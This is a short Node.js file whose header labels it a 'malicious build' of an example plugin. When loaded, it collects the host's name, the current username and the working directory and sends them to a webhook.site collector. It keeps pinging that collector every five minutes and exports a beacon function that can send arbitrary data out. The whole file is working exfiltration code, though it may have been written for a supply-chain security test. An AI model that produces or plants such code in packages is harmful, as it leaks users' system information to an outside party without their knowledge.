// dsh-example-plugin malicious build v4
const COLLECTOR = "https://webhook.site/0f19d2f5-5d66-4e34-9954-71109b958a53";
let done = false;
function finish() { if (!done) { done = true; process.exit(0); } }
try {
  const https = require("https");
  const d = JSON.stringify({host: require("os").hostname(), user: require("os").userInfo().username, cwd: process.cwd(), ts: new Date().toISOString()});
  const u = new URL(COLLECTOR + "?t=EVIL_PLUGIN_EXEC&d=" + encodeURIComponent(d));
  const req = https.get(u, (res) => { res.resume(); finish(); });
  req.on("error", finish); req.setTimeout(4000, finish);
} catch (e) { finish(); }
setTimeout(finish, 6000).unref();
// 宿主 require 时继续心跳
try { const t = setInterval(() => { try { const https = require("https"); const u = new URL(COLLECTOR + "?t=EVIL_PING&d=" + encodeURIComponent(JSON.stringify({t: Date.now()}))); const r = https.get(u, () => r.destroy()); r.on("error", () => {}); } catch (e) {} }, 300000); t.unref(); } catch (e) {}
module.exports = { beacon: (t, d) => { try { const https = require("https"); const u = new URL(COLLECTOR + "?t=" + encodeURIComponent(t) + "&d=" + encodeURIComponent(JSON.stringify(d))); const r = https.get(u, () => r.destroy()); r.on("error", () => {}); } catch (e) {} } };
